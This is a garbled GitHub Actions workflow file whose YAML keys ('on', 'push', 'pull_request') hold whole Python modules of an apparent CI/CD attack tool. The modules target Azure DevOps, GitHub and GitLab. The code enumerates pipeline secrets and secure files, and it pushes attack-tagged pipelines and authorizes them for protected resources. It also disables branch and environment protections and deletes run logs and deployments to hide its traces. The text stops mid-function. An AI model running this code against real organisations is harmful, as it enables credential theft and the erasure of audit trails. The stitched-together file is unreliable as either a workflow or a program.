name: Rust

on: import requests
import time
from os import makedirs
from nordstream.utils.log import logger
from nordstream.yaml.devops import DevOpsPipelineGenerator
from nordstream.git import Git
from nordstream.utils.errors import DevOpsError
from nordstream.utils.constants import *


class DevOps:
    _DEFAULT_PIPELINE_NAME = DEFAULT_PIPELINE_NAME
    _DEFAULT_BRANCH_NAME = DEFAULT_BRANCH_NAME
    _token = None
    _auth = None
    _org = None
    _devopsLoginId = None
    _projects = []
    _baseURL = "https://dev.azure.com/"
    _header = {
        "Accept": "application/json; api-version=6.0-preview",
        "User-Agent": USER_AGENT,
    }
    _session = None
    _repoName = DEFAULT_REPO_NAME
    _outputDir = OUTPUT_DIR
    _pipelineName = _DEFAULT_PIPELINE_NAME
    _branchName = _DEFAULT_BRANCH_NAME
    _sleepTime = 15
    _maxRetry = 10
    _verifyCert = True

    def __init__(self, token, org):
        self._token = token
        self._org = org
        self._baseURL += f"{org}/"
        self._auth = ("", self._token)
        self._session = requests.Session()
        self._devopsLoginId = self.__getLogin()

    @property
    def projects(self):
        return self._projects

    @property
    def org(self):
        return self._org

    @property
    def branchName(self):
        return self._branchName

    @branchName.setter
    def branchName(self, value):
        self._branchName = value

    @property
    def repoName(self):
        return self._repoName

    @repoName.setter
    def repoName(self, value):
        self._repoName = value

    @property
    def pipelineName(self):
        return self._pipelineName

    @pipelineName.setter
    def pipelineName(self, value):
        self._pipelineName = value

    @property
    def token(self):
        return self._token

    @property
    def outputDir(self):
        return self._outputDir

    @outputDir.setter
    def outputDir(self, value):
        self._outputDir = value

    @property
    def defaultPipelineName(self):
        return self._DEFAULT_PIPELINE_NAME

    @property
    def defaultBranchName(self):
        return self._DEFAULT_BRANCH_NAME

    def __getLogin(self):
        return self.getUser().get("authenticatedUser").get("id")

    def getUser(self):
        logger.debug("Retrieving user informations")
        return self._session.get(
            f"{self._baseURL}/_apis/ConnectionData",
            auth=self._auth,
            headers=self._header,
            verify=self._verifyCert,
        ).json()

    def listProjects(self):
        logger.debug("Listing projects")
        continuationToken = 0
        # Azure DevOps pagination
        while True:
            params = {"continuationToken": continuationToken}
            response = self._session.get(
                f"{self._baseURL}/_apis/projects",
                params=params,
                auth=self._auth,
                headers=self._header,
                verify=self._verifyCert,
            ).json()

            if len(response.get("value")) != 0:
                for repo in response.get("value"):
                    p = {"id": repo.get("id"), "name": repo.get("name")}
                    self._projects.append(p)
                continuationToken += response.get("count")
            else:
                break

    # TODO: crappy code I know
    def filterWriteProjects(self):
        continuationToken = None
        res = []
        params = {}
        # Azure DevOps pagination
        while True:
            if continuationToken:
                params = {"continuationToken": continuationToken}
            response = self._session.get(
                f"https://vssps.dev.azure.com/{self._org}/_apis/graph/groups",
                params=params,
                auth=self._auth,
                headers=self._header,
                verify=self._verifyCert,
            )

            headers = response.headers
            response = response.json()

            if len(response.get("value")) != 0:
                for project in self._projects:
                    for group in response.get("value"):
                        name = project.get("name")
                        if self.__checkProjectPrivs(self._devopsLoginId, name, group):
                            duplicate = False
                            for p in res:
                                if p.get("id") == project.get("id"):
                                    duplicate = True
                            if not duplicate:
                                res.append(project)

                continuationToken = headers.get("x-ms-continuationtoken", None)
                if not continuationToken:
                    break

            else:
                break
        self._projects = res

    def __checkProjectPrivs(self, login, projectName, group):
        groupPrincipalName = group.get("principalName")

        writeGroups = [
            f"[{projectName}]\\{projectName} Team",
            f"[{projectName}]\\Contributors",
            f"[{projectName}]\\Project Administrators",
        ]
        pagingToken = None
        params = {}

        for g in writeGroups:
            if groupPrincipalName == g:
                originId = group.get("originId")
                while True:
                    if pagingToken:
                        params = {"pagingToken": pagingToken}
                    response = self._session.get(
                        f"https://vsaex.dev.azure.com/{self._org}/_apis/GroupEntitlements/{originId}/members",
                        params=params,
                        auth=self._auth,
                        headers=self._header,
                        verify=self._verifyCert,
                    ).json()

                    pagingToken = response.get("continuationToken")
                    if len(response.get("items")) != 0:
                        for user in response.get("items"):
                            if user.get("id") == login:
                                return True

                    else:
                        return False

    def listRepositories(self, project):
        logger.debug("Listing repositories")
        response = self._session.get(
            f"{self._baseURL}/{project}/_apis/git/repositories",
            auth=self._auth,
            headers=self._header,
            verify=self._verifyCert,
        ).json()
        return response.get("value")

    def listPipelines(self, project):
        logger.debug("Listing pipelines")
        response = self._session.get(
            f"{self._baseURL}/{project}/_apis/pipelines",
            auth=self._auth,
            headers=self._header,
            verify=self._verifyCert,
        ).json()
        return response.get("value")

    def addProject(self, project):
        logger.debug(f"Checking project: {project}")

        response = self._session.get(
            f"{self._baseURL}/_apis/projects/{project}",
            auth=self._auth,
            headers=self._header,
            verify=self._verifyCert,
        ).json()

        if response.get("id"):
            p = {"id": response.get("id"), "name": response.get("name")}
            self._projects.append(p)

    @classmethod
    def checkToken(cls, token, org):
        logger.verbose(f"Checking token: {token}")
        try:
            return (
                requests.get(
                    f"https://dev.azure.com/{org}/_apis/ConnectionData",
                    auth=("foo", token),
                    verify=cls._verifyCert,
                ).status_code
                == 200
            )
        except Exception as e:
            logger.error(e)
            return False

    def listProjectVariableGroupsSecrets(self, project):
        logger.debug(f"Listing variable groups for: {project}")
        response = self._session.get(
            f"{self._baseURL}/{project}/_apis/distributedtask/variablegroups",
            auth=self._auth,
            headers=self._header,
            verify=self._verifyCert,
        )

        if response.status_code != 200:
            raise DevOpsError("Can't list variable groups secrets.")

        response = response.json()

        res = []

        if response.get("count", 0) != 0:
            for variableGroup in response.get("value"):
                name = variableGroup.get("name")
                id = variableGroup.get("id")
                variables = []
                for var in variableGroup.get("variables").keys():
                    variables.append(var)
                res.append({"name": name, "id": id, "variables": variables})
        return res

    def listProjectSecureFiles(self, project):
        logger.debug(f"Listing secure files for: {project}")
        response = self._session.get(
            f"{self._baseURL}/{project}/_apis/distributedtask/securefiles",
            auth=self._auth,
            headers=self._header,
            verify=self._verifyCert,
        )

        if response.status_code != 200:
            raise DevOpsError("Can't list secure files.")

        response = response.json()

        res = []

        if response["count"]:
            for secureFile in response["value"]:
                res.append({"name": secureFile["name"], "id": secureFile["id"]})
        return res

    def authorizePipelineForResourceAccess(self, projectId, pipelineId, resource, resourceType):
        resourceId = resource["id"]

        logger.debug(f"Checking current pipeline permissions for: \"{resource['name']}\"")
        response = self._session.get(
            f"{self._baseURL}/{projectId}/_apis/pipelines/pipelinePermissions/{resourceType}/{resourceId}",
            auth=self._auth,
            headers=self._header,
            verify=self._verifyCert,
        ).json()

        allPipelines = response.get("allPipelines")
        if allPipelines and allPipelines.get("authorized"):
            return True

        for pipeline in response.get("pipelines"):
            if pipeline.get("id") == pipelineId:
                return True

        logger.debug(f"\"{resource['name']}\" has restricted permissions. Adding access permissions for the pipeline")
        response = self._session.patch(
            f"{self._baseURL}/{projectId}/_apis/pipelines/pipelinePermissions/{resourceType}/{resourceId}",
            auth=self._auth,
            headers=self._header,
            verify=self._verifyCert,
            json={"pipelines": [{"id": pipelineId, "authorized": True}]},
        )

        if response.status_code != 200:
            logger.error(f"Error: unable to give the custom pipeline access to {resourceType}: \"{resource['name']}\"")
            return False
        return True

    def createGit(self, project):
        logger.debug(f"Creating git repo for: {project}")
        data = {"name": self._repoName, "project": {"id": project}}
        response = self._session.post(
            f"{self._baseURL}/{project}/_apis/git/repositories",
            json=data,
            auth=self._auth,
            headers=self._header,
            verify=self._verifyCert,
        ).json()

        return response

    def deleteGit(self, project, repoId):
        logger.debug(f"Deleting git repo for: {project}")
        response = self._session.delete(
            f"{self._baseURL}/{project}/_apis/git/repositories/{repoId}",
            auth=self._auth,
            headers=self._header,
            verify=self._verifyCert,
        )
        return response.status_code == 204

    def createPipeline(self, project, repoId, path):
        logger.debug("creating pipeline")
        data = {
            "folder": None,
            "name": self._pipelineName,
            "configuration": {
                "type": "yaml",
                "path": path,
                "repository": {
                    "id": repoId,
                    "type": "azureReposGit",
                    "defaultBranch": self._branchName,
                },
            },
        }
        response = self._session.post(
            f"{self._baseURL}/{project}/_apis/pipelines",
            json=data,
            auth=self._auth,
            headers=self._header,
            verify=self._verifyCert,
        ).json()
        return response.get("id")

    def runPipeline(self, project, pipelineId):
        logger.debug(f"Running pipeline: {pipelineId}")
        params = {
            "definition": {"id": pipelineId},
            "sourceBranch": f"refs/heads/{self._branchName}",
        }

        response = self._session.post(
            f"{self._baseURL}/{project}/_apis/build/Builds",
            json=params,
            auth=self._auth,
            headers=self._header,
            verify=self._verifyCert,
        ).json()

        return response

    def __getBuilds(self, project):
        logger.debug(f"Getting builds.")

        return (
            self._session.get(
                f"{self._baseURL}/{project}/_apis/build/Builds",
                auth=self._auth,
                headers=self._header,
                verify=self._verifyCert,
            )
            .json()
            .get("value")
        )

    def __getBuildSources(self, project, buildId):

        return self._session.get(
            f"{self._baseURL}/{project}/_apis/build/Builds/{buildId}/sources",
            auth=self._auth,
            headers=self._header,
            verify=self._verifyCert,
        ).json()

    def getRunId(self, project, pipelineId):
        logger.debug(f"Getting RunId for pipeline: {pipelineId}")

        for i in range(self._maxRetry):

            # Don't wait first time
            if i != 0:
                logger.warning(f"Run not available, sleeping for {self._sleepTime}s")
                time.sleep(self._sleepTime)

            for build in self.__getBuilds(project):

                if build.get("definition").get("id") == pipelineId:

                    buildId = build.get("id")
                    buildSource = self.__getBuildSources(project, buildId)

                    if (
                        buildSource.get("comment") == Git.ATTACK_COMMIT_MSG
                        and buildSource.get("author").get("email") == Git.EMAIL
                    ):
                        return buildId

            if i == (self._maxRetry):
                logger.error("Error: run still not ready.")

        return None

    def waitPipeline(self, project, pipelineId, runId):
        logger.info("Getting pipeline output")

        for i in range(self._maxRetry):

            if i != 0:
                logger.warning(f"Pipeline still running, sleeping for {self._sleepTime}s")
                time.sleep(self._sleepTime)

            response = self._session.get(
                f"{self._baseURL}/{project}/_apis/pipelines/{pipelineId}/runs/{runId}",
                json={},
                auth=self._auth,
                headers=self._header,
                verify=self._verifyCert,
            ).json()

            if response.get("state") == "completed":
                return response.get("result")
            if i == (self._maxRetry - 1):
                logger.error("Error: pipeline still not finished.")

        return None

    def __createPipelineOutputDir(self, projectName):
        makedirs(f"{self._outputDir}/{self._org}/{projectName}", exist_ok=True)

    def downloadPipelineOutput(self, projectId, runId):
        self.__createPipelineOutputDir(projectId)

        for i in range(self._maxRetry):

            if i != 0:
                logger.warning(f"Output not ready, sleeping for {self._sleepTime}s")
                time.sleep(self._sleepTime)

            buildTimeline = self._session.get(
                f"{self._baseURL}/{projectId}/_apis/build/builds/{runId}/timeline",
                json={},
                auth=self._auth,
                headers=self._header,
                verify=self._verifyCert,
            ).json()

            logs = [
                record["log"]["id"]
                for record in buildTimeline["records"]
                if record["name"] == DevOpsPipelineGenerator.taskName
            ]
            if len(logs) != 0:
                break

            # if there are logs but we didn't find the taskName get the last
            # job as it contain all data
            if len(buildTimeline["records"]) > 0:
                logs = [buildTimeline["records"][-1]["log"]["id"]]
                break

            if i == (self._maxRetry - 1):
                logger.error("Output still no ready, error !")
                return None

        logId = logs[0]

        logger.debug(f"Log ID of the extraction task: {logId}")

        for i in range(self._maxRetry):

            if i != 0:
                logger.warning(f"Output not ready, sleeping for {self._sleepTime}s")
                time.sleep(self._sleepTime)

            logOutput = self._session.get(
                f"{self._baseURL}/{projectId}/_apis/build/builds/{runId}/logs/{logId}",
                json={},
                auth=self._auth,
                headers=self._header,
                verify=self._verifyCert,
            ).json()
            if len(logOutput.get("value")) != 0:
                break
            if i == (self._maxRetry - 1):
                logger.error("Output still no ready, error !")
                return None

        date = time.strftime("%Y-%m-%d_%H-%M-%S")
        with open(f"{self._outputDir}/{self._org}/{projectId}/pipeline_{date}.log", "w") as f:
            for line in logOutput.get("value"):
                f.write(line + "\n")
        f.close()
        return f"pipeline_{date}.log"

    def __cleanRunLogs(self, projectId):
        logger.verbose("Cleaning run logs.")

        builds = self.__getBuilds(projectId)

        if len(builds) != 0:
            for build in builds:

                buildId = build.get("id")
                buildSource = self.__getBuildSources(projectId, buildId)

                if (
                    buildSource.get("comment") == (Git.ATTACK_COMMIT_MSG or Git.CLEAN_COMMIT_MSG)
                    and buildSource.get("author").get("email") == Git.EMAIL
                ):
                    return buildId

                self._session.delete(
                    f"{self._baseURL}/{projectId}/_apis/build/builds/{buildId}",
                    auth=self._auth,
                    headers=self._header,
                    verify=self._verifyCert,
                )

    def __cleanPipeline(self, projectId):
        logger.verbose(f"Removing pipeline.")

        response = self._session.get(
            f"{self._baseURL}/{projectId}/_apis/pipelines",
            auth=self._auth,
            headers=self._header,
            verify=self._verifyCert,
        ).json()
        if response.get("count", 0) != 0:
            for pipeline in response.get("value"):
                if pipeline.get("name") == self._pipelineName:
                    pipelineId = pipeline.get("id")
                    self._session.delete(
                        f"{self._baseURL}/{projectId}/_apis/pipelines/{pipelineId}",
                        auth=self._auth,
                        headers=self._header,
                        verify=self._verifyCert,
                    )

    def deletePipeline(self, projectId):
        logger.debug("Deleting pipeline")
        response = self._session.get(
            f"{self._baseURL}/{projectId}/_apis/build/Definitions",
            json={},
            auth=self._auth,
            headers=self._header,
            verify=self._verifyCert,
        ).json()
        if response.get("count", 0) != 0:
            for pipeline in response.get("value"):
                if pipeline.get("name") == self._pipelineName:
                    definitionId = pipeline.get("id")
                    self._session.delete(
                        f"{self._baseURL}/{projectId}/_apis/build/definitions/{definitionId}",
                        json={},
                        auth=self._auth,
                        headers=self._header,
                        verify=self._verifyCert,
                    )

    def cleanAllLogs(self, projectId):
        self.__cleanRunLogs(projectId)

    def listServiceConnections(self, projectId):
        logger.debug("Listing service connections")
        res = []
        response = self._session.get(
            f"{self._baseURL}/{projectId}/_apis/serviceendpoint/endpoints",
            json={},
            auth=self._auth,
            headers=self._header,
            verify=self._verifyCert,
        )

        if response.status_code != 200:
            raise DevOpsError("Can't list service connections.")

        response = response.json()

        if response.get("count", 0) != 0:
            res = response.get("value")
        return res

    def getFailureReason(self, projectId, runId):
        res = []

        response = self._session.get(
            f"{self._baseURL}/{projectId}/_apis/build/builds/{runId}",
            auth=self._auth,
            headers=self._header,
        ).json()
        for result in response.get("validationResults"):
            res.append(result.get("message"))

        try:
            timeline = self._session.get(
                f"{self._baseURL}/{projectId}/_apis/build/builds/{runId}/Timeline",
                auth=self._auth,
                headers=self._header,
            ).json()
            for record in timeline.get("records", []):
                if record.get("issues"):
                    for issue in record.get("issues"):
                        res.append(issue.get("message"))
        except:
            pass
        return res
  push: import requests
import time
from os import makedirs
import urllib.parse
from nordstream.utils.errors import GitHubError, GitHubBadCredentials
from nordstream.utils.log import logger
from nordstream.git import Git
from nordstream.utils.constants import *


class GitHub:
    _DEFAULT_BRANCH_NAME = DEFAULT_BRANCH_NAME
    _token = None
    _auth = None
    _org = None
    _githubLogin = None
    _repos = []
    _header = {
        "Accept": "application/vnd.github+json",
        "User-Agent": USER_AGENT,
    }
    _repoURL = "https://api.github.com/repos"
    _session = None
    _branchName = _DEFAULT_BRANCH_NAME
    _outputDir = OUTPUT_DIR
    _sleepTime = 15
    _maxRetry = 10
    _isGHSToken = False

    def __init__(self, token):
        self._token = token
        self._auth = ("foo", self._token)
        self._session = requests.Session()
        if token.lower().startswith("ghs_"):
            self._isGHSToken = True

        self._githubLogin = self.__getLogin()

    @staticmethod
    def checkToken(token):
        logger.verbose(f"Checking token: {token}")

        headers = GitHub._header
        headers["Authorization"] = f"token {token}"

        data = {"query": "query UserCurrent{viewer{login}}"}

        return requests.post("https://api.github.com/graphql", headers=headers, json=data).status_code == 200

    @property
    def token(self):
        return self._token

    @property
    def org(self):
        return self._org

    @org.setter
    def org(self, org):
        self._org = org

    @property
    def defaultBranchName(self):
        return self._DEFAULT_BRANCH_NAME

    @property
    def branchName(self):
        return self._branchName

    @branchName.setter
    def branchName(self, value):
        self._branchName = value

    @property
    def repos(self):
        return self._repos

    @property
    def outputDir(self):
        return self._outputDir

    @outputDir.setter
    def outputDir(self, value):
        self._outputDir = value

    def __getLogin(self):
        return self.getLoginWithGraphQL().json().get("data").get("viewer").get("login")

    def getUser(self):
        logger.debug("Retrieving user informations")
        return self._session.get(f"https://api.github.com/user", auth=self._auth, headers=self._header)

    def getLoginWithGraphQL(self):
        logger.debug("Retrieving identity with GraphQL")

        headers = self._header
        headers["Authorization"] = f"token {self._token}"

        data = {"query": "query UserCurrent{viewer{login}}"}

        return self._session.post("https://api.github.com/graphql", headers=headers, json=data)

    def __paginatedGet(self, url, data=""):

        page = 1
        res = []
        while True:

            params = {"page": page}

            response = self._session.get(
                url,
                params=params,
                auth=self._auth,
                headers=self._header,
            ).json()

            if not isinstance(response, list) and response.get("message", None):
                if response.get("message") == "Bad credentials":
                    raise GitHubBadCredentials(response.get("message"))
                elif response.get("message") != "Not Found":
                    raise GitHubError(response.get("message"))
                return res

            if (data != "" and len(response.get(data)) == 0) or (data == "" and len(response) == 0):
                break

            if data != "" and len(response.get(data)) != 0:
                res.extend(response.get(data, []))

            if data == "" and len(response) != 0:
                res.extend(response)

            page += 1

        return res

    def listRepos(self):
        logger.debug("Listing repos")

        if self._isGHSToken:
            url = f"https://api.github.com/orgs/{self._org}/repos"
        else:
            url = f"https://api.github.com/user/repos"

        response = self.__paginatedGet(url)

        for repo in response:
            # filter for specific org
            if self._org:
                if self._org.lower() == repo.get("owner").get("login").lower():
                    self._repos.append(repo.get("full_name"))
            else:
                self._repos.append(repo.get("full_name"))

    def addRepo(self, repo):
        logger.debug(f"Checking repo: {repo}")
        if self._org:
            full_name = self._org + "/" + repo
        else:
            # if no org, must provide repo as 'org/repo'
            # FIXME: This cannot happen at the moment because --org argument is required
            if len(repo.split("/")) == 2:
                full_name = repo
            else:
                # FIXME: Raise an Exception here
                logger.error("Invalid repo name: {repo}")

        response = self._session.get(
            f"{self._repoURL}/{full_name}",
            auth=self._auth,
            headers=self._header,
        ).json()

        if response.get("message", None) and response.get("message") == "Bad credentials":
            raise GitHubBadCredentials(response.get("message"))

        if response.get("id"):
            self._repos.append(response.get("full_name"))

    def listEnvFromrepo(self, repo):
        logger.debug(f"Listing environment secret from repo: {repo}")
        res = []
        response = self.__paginatedGet(f"{self._repoURL}/{repo}/environments", data="environments")

        for env in response:
            res.append(env.get("name"))
        return res

    def listSecretsFromEnv(self, repo, env):
        logger.debug(f"Getting environment secrets for {repo}: {env}")
        envReq = urllib.parse.quote(env, safe="")
        res = []

        response = self.__paginatedGet(f"{self._repoURL}/{repo}/environments/{envReq}/secrets", data="secrets")

        for sec in response:
            res.append(sec.get("name"))

        return res

    def listSecretsFromRepo(self, repo):
        res = []

        response = self.__paginatedGet(f"{self._repoURL}/{repo}/actions/secrets", data="secrets")

        for sec in response:
            res.append(sec.get("name"))

        return res

    def listOrganizationSecretsFromRepo(self, repo):
        res = []

        response = self.__paginatedGet(f"{self._repoURL}/{repo}/actions/organization-secrets", data="secrets")

        for sec in response:
            res.append(sec.get("name"))

        return res

    def listDependabotSecretsFromRepo(self, repo):
        res = []

        response = self.__paginatedGet(f"{self._repoURL}/{repo}/dependabot/secrets", data="secrets")

        for sec in response:
            res.append(sec.get("name"))

        return res

    def listDependabotOrganizationSecrets(self):
        res = []

        response = self.__paginatedGet(f"https://api.github.com/orgs/{self._org}/dependabot/secrets", data="secrets")

        for sec in response:
            res.append(sec.get("name"))

        return res

    def listEnvProtections(self, repo, env):
        logger.debug("Getting environment protections")
        envReq = urllib.parse.quote(env, safe="")
        res = []
        response = requests.get(
            f"{self._repoURL}/{repo}/environments/{envReq}",
            auth=self._auth,
            headers=self._header,
        ).json()

        for protection in response.get("protection_rules"):
            protectionType = protection.get("type")
            res.append(protectionType)

        return res

    def getEnvDetails(self, repo, env):
        envReq = urllib.parse.quote(env, safe="")
        response = self._session.get(
            f"{self._repoURL}/{repo}/environments/{envReq}",
            auth=self._auth,
            headers=self._header,
        ).json()

        if response.get("message"):
            raise GitHubError(response.get("message"))
        return response

    def createDeploymentBranchPolicy(self, repo, env):
        envReq = urllib.parse.quote(env, safe="")
        logger.debug(f"Adding new branch policy for {self._branchName} on {envReq}")

        data = {"name": f"{self._branchName}"}
        response = self._session.post(
            f"{self._repoURL}/{repo}/environments/{envReq}/deployment-branch-policies",
            json=data,
            auth=self._auth,
            headers=self._header,
        ).json()

        if response.get("message"):
            raise GitHubError(response.get("message"))

        policyId = response.get("id")
        logger.debug(f"Branch policy id: {policyId}")
        return policyId

    def deleteDeploymentBranchPolicy(self, repo, env):
        logger.debug("Delete deployment branch policy")
        envReq = urllib.parse.quote(env, safe="")
        response = self._session.get(
            f"{self._repoURL}/{repo}/environments/{envReq}",
            auth=self._auth,
            headers=self._header,
        ).json()

        if response.get("deployment_branch_policy") is not None:
            response = self._session.get(
                f"{self._repoURL}/{repo}/environments/{envReq}/deployment-branch-policies",
                auth=self._auth,
                headers=self._header,
            ).json()

            for policy in response.get("branch_policies"):
                if policy.get("name").lower() == self._branchName.lower():
                    logger.verbose(f"Deleting branch policy for {self._branchName} on {envReq}")
                    policyId = policy.get("id")
                    self._session.delete(
                        f"{self._repoURL}/{repo}/environments/{envReq}/deployment-branch-policies/{policyId}",
                        auth=self._auth,
                        headers=self._header,
                    )

    def disableBranchProtectionRules(self, repo):
        logger.debug("Modifying branch protection")
        response = self._session.get(
            f"{self._repoURL}/{repo}/branches/{self._branchName}",
            auth=self._auth,
            headers=self._header,
        ).json()

        if response.get("name") and response.get("protected"):
            data = {
                "required_status_checks": None,
                "enforce_admins": False,
                "required_pull_request_reviews": None,
                "restrictions": None,
                "allow_deletions": True,
                "allow_force_pushes": True,
            }
            self._session.put(
                f"{self._repoURL}/{repo}/branches/{self._branchName}/protection",
                json=data,
                auth=self._auth,
                headers=self._header,
            )

    def modifyEnvProtectionRules(self, repo, env, wait, reviewers, branchPolicy):
        data = {
            "wait_timer": wait,
            "reviewers": reviewers,
            "deployment_branch_policy": branchPolicy,
        }
        envReq = urllib.parse.quote(env, safe="")
        response = self._session.put(
            f"{self._repoURL}/{repo}/environments/{envReq}",
            json=data,
            auth=self._auth,
            headers=self._header,
        ).json()

        if response.get("message"):
            raise GitHubError(response.get("message"))
        return response

    def deleteDeploymentBranchPolicyForAllEnv(self, repo):
        allEnv = self.listEnvFromrepo(repo)
        for env in allEnv:
            self.deleteDeploymentBranchPolicy(repo, env)

    def checkBranchProtectionRules(self, repo):
        response = self._session.get(
            f"{self._repoURL}/{repo}/branches/{self._branchName}",
            auth=self._auth,
            headers=self._header,
        ).json()
        if response.get("message"):
            raise GitHubError(response.get("message"))
        return response.get("protected")

    def getBranchesProtectionRules(self, repo):
        logger.debug("Getting branch protection rules")
        response = self._session.get(
            f"{self._repoURL}/{repo}/branches/{self._branchName}/protection",
            auth=self._auth,
            headers=self._header,
        ).json()
        if response.get("message"):
            return None
        return response

    def updateBranchesProtectionRules(self, repo, protections):
        logger.debug("Updating branch protection rules")

        response = self._session.put(
            f"{self._repoURL}/{repo}/branches/{self._branchName}/protection",
            auth=self._auth,
            headers=self._header,
            json=protections,
        ).json()

        return response

    def cleanDeploymentsLogs(self, repo):
        logger.verbose(f"Cleaning deployment logs from: {repo}")
        url = f"{self._repoURL}/{repo}/deployments?ref={self._branchName}"
        response = self.__paginatedGet(url)

        for deployment in response:
            if not self._isGHSToken and deployment.get("creator").get("login").lower() != self._githubLogin.lower():
                continue

            commit = self._session.get(
                f"{self._repoURL}/{repo}/commits/{deployment['sha']}", auth=self._auth, headers=self._header
            ).json()

            if commit["commit"]["message"] != (Git.ATTACK_COMMIT_MSG and Git.CLEAN_COMMIT_MSG):
                continue

            deploymentId = deployment.get("id")
            data = {"state": "inactive"}
            self._session.post(
                f"{self._repoURL}/{repo}/deployments/{deploymentId}/statuses",
                json=data,
                auth=self._auth,
                headers=self._header,
            )
            self._session.delete(
                f"{self._repoURL}/{repo}/deployments/{deploymentId}",
                auth=self._auth,
                headers=self._header,
            )

    def cleanRunLogs(self, repo, workflowFilename):
        logger.verbose(f"Cleaning run logs from: {repo}")
        url = f"{self._repoURL}/{repo}/actions/workflows/{workflowFilename}/runs?branch={self._branchName}"
        response = self.__paginatedGet(url, data="workflow_runs")

        for run in response:
            runId = run.get("id")
            status = (
                self._session.get(
                    f"{self._repoURL}/{repo}/actions/runs/{runId}",
                    json={},
                    auth=self._auth,
                    headers=self._header,
                )
                .json()
                .get("status")
            )

            if status != "completed":
                self._session.post(
                    f"{self._repoURL}/{repo}/actions/runs/{runId}/cancel",
                    json={},
                    auth=self._auth,
                    headers=self._header,
                )
                status = (
                    self._session.get(
                        f"{self._repoURL}/{repo}/actions/runs/{runId}",
                        json={},
                        auth=self._auth,
                        headers=self._header,
                    )
                    .json()
                    .get("status")
                )
                if status != "completed":
                    for i in range(self._maxRetry):
                        time.sleep(2)
                        status = (
                            self._session.get(
                                f"{self._repoURL}/{repo}/actions/runs/{runId}",
                                json={},
                                auth=self._auth,
                                headers=self._header,
                            )
                            .json()
                            .get("status")
                        )
                        if status == "completed":
                            break

            self._session.delete(
                f"{self._repoURL}/{repo}/actions/runs/{runId}/logs",
                auth=self._auth,
                headers=self._header,
            )
            self._session.delete(
                f"{self._repoURL}/{repo}/actions/runs/{runId}",
                auth=self._auth,
                headers=self._header,
            )

    def cleanAllLogs(self, repo, workflowFilename):
        logger.debug(f"Cleaning logs for: {repo}")
        self.cleanRunLogs(repo, workflowFilename)
        self.cleanDeploymentsLogs(repo)

    def createWorkflowOutputDir(self, repo):
        outputName = repo.split("/")
        makedirs(f"{self._outputDir}/{outputName[0]}/{outputName[1]}", exist_ok=True)

    def waitWorkflow(self, repo, workflowFilename):
        logger.info("Getting workflow output")

        time.sleep(5)
        workflowFilename = urllib.parse.quote_plus(workflowFilename)
        response = self._session.get(
            f"{self._repoURL}/{repo}/actions/workflows/{workflowFilename}/runs?branch={self._branchName}",
            auth=self._auth,
            headers=self._header,
        ).json()

        if response.get("total_count", 0) == 0:
            for i in range(self._maxRetry):
                logger.warning(f"Workflow not started, sleeping for {self._sleepTime}s")
                time.sleep(self._sleepTime)
                response = self._session.get(
                    f"{self._repoURL}/{repo}/actions/workflows/{workflowFilename}/runs?branch={self._branchName}",
                    auth=self._auth,
                    headers=self._header,
                ).json()
                if response.get("total_count", 0) != 0:
                    break
                if i == (self._maxRetry - 1):
                    logger.error("Error: workflow still not started.")
                    return None, None

        if response.get("workflow_runs")[0].get("status") != "completed":
            for i in range(self._maxRetry):
                logger.warning(f"Workflow not finished, sleeping for {self._sleepTime}s")
                time.sleep(self._sleepTime)
                response = self._session.get(
                    f"{self._repoURL}/{repo}/actions/workflows/{workflowFilename}/runs?branch={self._branchName}",
                    auth=self._auth,
                    headers=self._header,
                ).json()
                if response.get("workflow_runs")[0].get("status") == "completed":
                    break
                if i == (self._maxRetry - 1):
                    logger.error("Error: workflow still not finished.")

        return (
            response.get("workflow_runs")[0].get("id"),
            response.get("workflow_runs")[0].get("conclusion"),
        )

    def downloadWorkflowOutput(self, repo, name, workflowId):
        self.createWorkflowOutputDir(repo)

        zipFile = self._session.get(
            f"{self._repoURL}/{repo}/actions/runs/{workflowId}/logs",
            auth=self._auth,
            headers=self._header,
        )

        date = time.strftime("%Y-%m-%d_%H-%M-%S")
        with open(f"{self._outputDir}/{repo}/workflow_{name}_{date}.zip", "wb") as f:
            f.write(zipFile.content)
        f.close()
        return f"workflow_{name}_{date}.zip"

    def getFailureReason(self, repo, workflowId):
        res = []
        workflow = self._session.get(
            f"{self._repoURL}/{repo}/actions/runs/{workflowId}",
            auth=self._auth,
            headers=self._header,
        ).json()
        checkSuiteId = workflow.get("check_suite_id")
        checkRuns = self._session.get(
            f"{self._repoURL}/{repo}/check-suites/{checkSuiteId}/check-runs",
            auth=self._auth,
            headers=self._header,
        ).json()

        if checkRuns.get("total_count"):
            for checkRun in checkRuns.get("check_runs"):
                checkRunId = checkRun.get("id")
                annotations = self._session.get(
                    f"{self._repoURL}/{repo}/check-runs/{checkRunId}/annotations",
                    auth=self._auth,
                    headers=self._header,
                ).json()
                for annotation in annotations:
                    res.append(annotation.get("message"))
        return res

    def filterWriteRepos(self):
        res = []
        for repo in self._repos:
            try:
                self.listSecretsFromRepo(repo)
                res.append(repo)
            except GitHubError:
                pass
        self._repos = res

    def isGHSToken(self):
        return self._isGHSToken
    branches: [ "main" ]
  pull_request: import requests
import time
from os import makedirs
from nordstream.utils.log import logger
from nordstream.utils.errors import GitLabError
from nordstream.git import Git
from nordstream.utils.constants import *
from nordstream.utils.helpers import isGitLabSessionCookie
import urllib3

# painfull warnings you know what you are doing right ?
requests.packages.urllib3.disable_warnings()


class GitLab:
    _DEFAULT_BRANCH_NAME = DEFAULT_BRANCH_NAME
    _auth = None
    _session = None
    _token = None
    _projects = []
    _groups = []
    _outputDir = OUTPUT_DIR
    _headers = {
        "User-Agent": USER_AGENT,
    }
    _cookies = {}
    _gitlabURL = None
    _branchName = _DEFAULT_BRANCH_NAME
    _sleepTime = 15
    _maxRetry = 10

    def __init__(self, url, token, verifCert):
        self._gitlabURL = url.strip("/")
        self._token = token
        self._session = requests.Session()
        self._session.verify = verifCert
        self.setCookiesAndHeaders()
        self._gitlabLogin = self.__getLogin()

    @property
    def projects(self):
        return self._projects

    @property
    def groups(self):
        return self._groups

    @property
    def token(self):
        return self._token

    @property
    def url(self):
        return self._gitlabURL

    @property
    def outputDir(self):
        return self._outputDir

    @outputDir.setter
    def outputDir(self, value):
        self._outputDir = value

    @property
    def defaultBranchName(self):
        return self._DEFAULT_BRANCH_NAME

    @property
    def branchName(self):
        return self._branchName

    @branchName.setter
    def branchName(self, value):
        self._branchName = value

    @classmethod
    def checkToken(cls, token, gitlabURL, verifyCert):
        logger.verbose(f"Checking token: {token}")
        # from https://docs.gitlab.com/ee/api/rest/index.html#personalprojectgroup-access-tokens
        try:
            cookies = {}
            headers = {"User-Agent": USER_AGENT}

            if isGitLabSessionCookie(token):
